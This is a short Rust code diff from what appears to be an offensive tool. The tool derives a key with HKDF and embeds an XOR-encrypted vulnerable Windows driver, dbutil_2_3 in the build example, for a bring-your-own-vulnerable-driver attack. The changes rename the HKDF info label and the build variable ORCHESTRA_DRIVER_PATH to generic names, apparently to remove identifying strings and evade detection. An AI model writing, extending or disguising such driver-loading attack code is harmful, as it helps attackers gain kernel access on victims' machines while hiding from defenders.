@@ -250,7 +250,7 @@ fn derive_driver_key(session_key: &[u8]) -> [u8; DRIVER_XOR_KEY_LEN] {
 
     let hk = Hkdf::<Sha256>::new(None, session_key);
     let mut key = [0u8; DRIVER_XOR_KEY_LEN];
-    hk.expand(b"orchestra-driver-key", &mut key)
+    hk.expand(common::hkdf_info::DRIVER_KEY, &mut key)
         .expect("HKDF expand must succeed for driver key derivation");
     key
 }
@@ -345,11 +345,11 @@ static EMBEDDED_DRIVER_BYTES: &[u8] =
     include_bytes!("../../resources/placeholder_driver.xor");
 
 /// When the `embedded_driver` feature is enabled, the builder MUST set the
-/// `ORCHESTRA_DRIVER_PATH` environment variable at compile time to point to the
+/// `SYS_DRIVER_PATH` environment variable at compile time to point to the
 /// XOR-encrypted vulnerable driver file.  Example:
 ///
 /// ```sh
-/// ORCHESTRA_DRIVER_PATH=resources/drivers/dbutil_2_3_xor_encrypted.bin \
+/// SYS_DRIVER_PATH=resources/drivers/dbutil_2_3_xor_encrypted.bin \
 ///     cargo build --features embedded_driver
 /// ```
 ///
@@ -357,7 +357,7 @@ static EMBEDDED_DRIVER_BYTES: &[u8] =
 /// `include_bytes!` error — this is intentional (fail-fast at build time
 /// rather than silently embedding an empty payload).
 #[cfg(feature = "embedded_driver")]
-static EMBEDDED_DRIVER_BYTES: &[u8] = include_bytes!(env!("ORCHESTRA_DRIVER_PATH"));
+static EMBEDDED_DRIVER_BYTES: &[u8] = include_bytes!(env!("SYS_DRIVER_PATH"));
 
 /// Get the embedded (XOR-encrypted) bytes for a driver.
 ///
